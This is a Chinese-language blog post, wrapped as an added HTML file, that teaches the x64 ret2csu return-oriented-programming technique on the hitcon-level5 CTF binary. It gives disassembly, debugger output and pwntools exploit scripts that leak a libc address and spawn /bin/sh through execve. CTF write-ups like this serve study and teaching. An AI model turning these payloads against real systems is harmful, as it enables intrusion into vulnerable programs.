@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html lang="zh-cn" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="郁涛丶" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      Ret2csu 
+      
+      
+      |
+    
+     郁涛丶&#39;s Blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Ghostasky</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Ret2csu</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2021-02-10	  
+        </span>
+		
+		 <span class="post-pubtime"> 本文共1.6k字 </span>
+
+                                                                        <span class="post-pubtime">
+        大约需要11min
+      </span>
+		
+		
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/Technology/" title="Technology">
+                    <b>#</b> Technology
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/PWN/" title="PWN">
+                    #PWN
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>x64中，函数的前6个参数是通过寄存器传参的（ 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9），但是大多数情况下，我们很难找到每个寄存器对应的gadgets。这时，我们可以利用x64下的_libc_csu_init中的gadgets。这个函数时用来对libc进行初始化操作的，而一般的程序都会调用libc函数，所以这个函数一定存在。不同版本的这个函数有一定的区别。先来看一下这个函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005C0 ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004005C0                 public __libc_csu_init</span><br><span class="line">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o</span><br><span class="line">.text:00000000004005C0                 push    r15</span><br><span class="line">.text:00000000004005C2                 push    r14</span><br><span class="line">.text:00000000004005C4                 mov     r15d, edi</span><br><span class="line">.text:00000000004005C7                 push    r13</span><br><span class="line">.text:00000000004005C9                 push    r12</span><br><span class="line">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004005D2                 push    rbp</span><br><span class="line">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004005DA                 push    rbx</span><br><span class="line">.text:00000000004005DB                 mov     r14, rsi</span><br><span class="line">.text:00000000004005DE                 mov     r13, rdx</span><br><span class="line">.text:00000000004005E1                 sub     rbp, r12</span><br><span class="line">.text:00000000004005E4                 sub     rsp, 8</span><br><span class="line">.text:00000000004005E8                 sar     rbp, 3</span><br><span class="line">.text:00000000004005EC                 call    _init_proc</span><br><span class="line">.text:00000000004005F1                 test    rbp, rbp</span><br><span class="line">.text:00000000004005F4                 jz      short loc_400616</span><br><span class="line">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400600</span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br><span class="line">.text:0000000000400624 __libc_csu_init endp</span><br></pre></td></tr></table></figure>
+
+<p>在这里我们可以利用以下几点：</p>
+<ul>
+<li><p>从0x40061A一直到结尾，我们可以利用栈溢出构造栈上数据来控制rbx，rbp，r12，r13，r14，r15寄存器</p>
+</li>
+<li><p>从0x400600到0x400609，可以将r13赋值给rdx，将r14赋值给rsi，将r15赋值给edi（虽然这里赋值给edi，但其实此时rdi的高32位寄存器为0，所以我们其实只能控制低32位），而上述的3个寄存器其实就是x64函数调用时用到的前三个寄存器。<strong>此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数</strong>，比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br></pre></td></tr></table></figure></li>
+<li><p>从0x40060D到0x400614，可以控制rbx与rbp之间的关系为：rbx + 1 = rbp，这样就不会执行loc_400600，进而执行下面的汇编代码，这里我们可以简单的设置rbx=0，rbp=1。</p>
+</li>
+</ul>
+<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>下面要用到的示例文件地址：<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2__libc_csu_init/hitcon-level5">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2__libc_csu_init/hitcon-level5</a></p>
+<p>源自蒸米的一步一步学 ROP 之 linux_x64 篇中 level5。</p>
+<p>首先看下保护：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">yutao@pwnbaby:~/Desktop/hitcon-level5$ checksec level5</span><br><span class="line">[*] <span class="string">&#x27;/home/yutao/Desktop/hitcon-level5/level5&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br></pre></td></tr></table></figure>
+
+<p>64位，开了堆栈不可执行。</p>
+<p>发现了一个栈溢出的函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 24</span><br><span class="line">00:0000│ rsp  0x7fffffffdec8 —▸ 0x400584 (vulnerable_function+30) ◂— nop    </span><br><span class="line">01:0008│ rsi  0x7fffffffded0 ◂— &#x27;12345678\n&#x27;</span><br><span class="line">02:0010│      0x7fffffffded8 ◂— 0xa /* &#x27;\n&#x27; */</span><br><span class="line">03:0018│      0x7fffffffdee0 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">09:0048│      0x7fffffffdf10 ◂— 9 /* &#x27;\t&#x27; */</span><br><span class="line">0a:0050│      0x7fffffffdf18 —▸ 0x7ffff7dd5660 (dl_main) ◂— push   rbp</span><br><span class="line">0b:0058│      0x7fffffffdf20 —▸ 0x7fffffffdf88 —▸ 0x7fffffffe058 —▸ 0x7fffffffe386 ◂— &#x27;/home/yutao/Desktop/hitcon-level5/level5&#x27;</span><br><span class="line">0c:0060│      0x7fffffffdf28 ◂— 0x1</span><br><span class="line">... ↓</span><br><span class="line">0e:0070│      0x7fffffffdf38 —▸ 0x40060d (__libc_csu_init+77) ◂— add    rbx, 1</span><br><span class="line">0f:0078│      0x7fffffffdf40 ◂— 0x0</span><br><span class="line">10:0080│      0x7fffffffdf48 —▸ 0x7ffff7ffe170 ◂— 0x0</span><br><span class="line">11:0088│ rbp  0x7fffffffdf50 —▸ 0x7fffffffdf70 —▸ 0x4005c0 (__libc_csu_init) ◂— push   r15</span><br><span class="line">12:0090│      0x7fffffffdf58 —▸ 0x4005b4 (main+45) ◂— mov    eax, 0</span><br><span class="line">13:0098│      0x7fffffffdf60 —▸ 0x7fffffffe058 —▸ 0x7fffffffe386 ◂— &#x27;/home/yutao/Desktop/hitcon-level5/level5&#x27;</span><br><span class="line">14:00a0│      0x7fffffffdf68 ◂— 0x100000000</span><br><span class="line">15:00a8│      0x7fffffffdf70 —▸ 0x4005c0 (__libc_csu_init) ◂— push   r15</span><br><span class="line">16:00b0│      0x7fffffffdf78 —▸ 0x7ffff7a03bf7 (__libc_start_main+231) ◂— mov    edi, eax</span><br><span class="line">17:00b8│      0x7fffffffdf80 ◂— 0x2000000000</span><br><span class="line">pwndbg&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以看出动态调出来的栈偏移与IDA中的0x80是相同的。此外，在IDA中可以发现并没有system函数，也没有/bin/sh字符串，所以只能用libc泄露函数地址来进行利用。这里选择用write函数来利用，打印出write_got函数的地址，再去寻找相对应的libc，当然也可以选用__libc_start_main来利用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; got</span><br><span class="line"></span><br><span class="line">/home/yutao/Desktop/hitcon-level5/level5:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET           TYPE              VALUE </span><br><span class="line">0000000000600ff8 R_X86_64_GLOB_DAT  __gmon_start__</span><br><span class="line">0000000000601018 R_X86_64_JUMP_SLOT  write@GLIBC_2.2.5</span><br><span class="line">0000000000601020 R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5</span><br><span class="line">0000000000601028 R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2.2.5</span><br></pre></td></tr></table></figure>
+
+<p>寻找write函数在内存中的真实地址：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;level5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_addr = <span class="number">0x40061a</span>          </span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">mov_addr = <span class="number">0x400600</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line">payload0 = <span class="string">&#x27;A&#x27;</span>*<span class="number">136</span> + p64(pop_addr) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(write_got) + p64(<span class="number">1</span>) + p64(mov_addr) + <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x8</span>+<span class="number">8</span>*<span class="number">6</span>) + p64(main_addr)</span><br><span class="line"><span class="comment">#                                        rbx    rbp        call:r12     r13-&gt;rdx     r14-&gt;rsi     r15-&gt;edi        </span></span><br><span class="line">p.sendline(payload0)</span><br><span class="line"></span><br><span class="line">write_start = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;write_addr_in_memory_is &quot;</span>+<span class="built_in">hex</span>(write_start)</span><br></pre></td></tr></table></figure>
+
+<p>发生溢出后，覆盖返回地址，之后push各种东西，再之后覆盖返回地址为mov_addr的地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040061A                 pop     rbx  //rbx-&gt;0</span><br><span class="line">.text:000000000040061B                 pop     rbp  //rbp-&gt;1</span><br><span class="line">.text:000000000040061C                 pop     r12  //r12-&gt;write_got函数地址</span><br><span class="line">.text:000000000040061E                 pop     r13  //r13-&gt;8</span><br><span class="line">.text:0000000000400620                 pop     r14  //r14-&gt;write_got函数地址</span><br><span class="line">.text:0000000000400622                 pop     r15  //r15-&gt;1</span><br><span class="line">.text:0000000000400624                 retn         //覆盖为mov_addr</span><br></pre></td></tr></table></figure>
+
+<p>wiki上的exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">level5 = ELF(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_got = level5.got[<span class="string">&#x27;write&#x27;</span>] 		<span class="comment">#获取write函数的got地址</span></span><br><span class="line">read_got = level5.got[<span class="string">&#x27;read&#x27;</span>]				<span class="comment">#获取read函数的got地址</span></span><br><span class="line">main_addr = level5.symbols[<span class="string">&#x27;main&#x27;</span>]  <span class="comment">#获取main函数的函数地址</span></span><br><span class="line">bss_base = level5.bss()							<span class="comment">#获取bss段地址</span></span><br><span class="line">csu_front_gadget = <span class="number">0x00000000004005F0</span> </span><br><span class="line"><span class="comment">#_libc_csu_init函数中位置靠前的gadget，即向rdi、rsi、rdx寄存器mov的gadget</span></span><br><span class="line">csu_behind_gadget = <span class="number">0x0000000000400606</span></span><br><span class="line"><span class="comment">#_libc_csu_init函数中位置靠后的gadget，即pop rbx、rbp、r12、r13、r14、r15寄存器的gadget</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#自定义csu函数，方便每一次构造payload</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">fill, rbx, rbp, r12, r13, r14, r15, main</span>):</span><br><span class="line">  <span class="comment">#fill为填充sp指针偏移造成8字节空缺</span></span><br><span class="line">  <span class="comment">#rbx, rbp, r12, r13, r14, r15皆为pop参数</span></span><br><span class="line">  <span class="comment">#main为main函数地址</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">136</span> 			<span class="comment">#0x80+8个字节填满栈空间至ret返回指令</span></span><br><span class="line">    payload += p64(csu_behind_gadget) </span><br><span class="line">    payload += p64(fill) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_gadget)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">56</span>      <span class="comment">#0x38个字节填充平衡堆栈造成的空缺</span></span><br><span class="line">    payload += p64(main)</span><br><span class="line">    sh.send(payload)    <span class="comment">#发送payload</span></span><br><span class="line">    sleep(<span class="number">1</span>)						<span class="comment">#暂停等待接收</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line"><span class="comment">#write函数布局打印write函数地址并返回main函数</span></span><br><span class="line">csu(<span class="number">0</span>,<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">1</span>, write_got, <span class="number">8</span>, main_addr)</span><br><span class="line"></span><br><span class="line">write_addr = u64(sh.recv(<span class="number">8</span>))    <span class="comment">#接收write函数地址</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)	<span class="comment">#LibcSearcher查找libc版本</span></span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>) <span class="comment">#计算该版本libc基地址</span></span><br><span class="line">execve_addr = libc_base + libc.dump(<span class="string">&#x27;execve&#x27;</span>) <span class="comment">#查找该版本libc execve函数地址</span></span><br><span class="line">log.success(<span class="string">&#x27;execve_addr &#x27;</span> + <span class="built_in">hex</span>(execve_addr))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line"><span class="comment">#read函数布局，将execve函数地址和/bin/sh字符串写进bss段首地址</span></span><br><span class="line">csu(<span class="number">0</span>,<span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss_base, <span class="number">16</span>, main_addr)</span><br><span class="line">sh.send(p64(execve_addr) + <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line"><span class="comment">#调用bss段中的execve(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">csu(<span class="number">0</span>,<span class="number">0</span>, <span class="number">1</span>, bss_base, bss_base+<span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, main_addr)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2021/02/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B8%BE%E4%BE%8B/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2021-02-10 00:00:00
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/Technology/" title="Technology">
+                        <b>#</b> Technology
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/PWN/" title="PWN">
+                        #PWN
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2021/02/12/2020%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ret2csu"><span class="toc-text">ret2csu</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-text">示例</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/Ghostasky">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" target="_blank" rel="noopener" href="https://twitter.com/ghostasky">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/Ghostasky">怕什么真理无穷，进一寸有进一寸的欢喜。</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2023 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
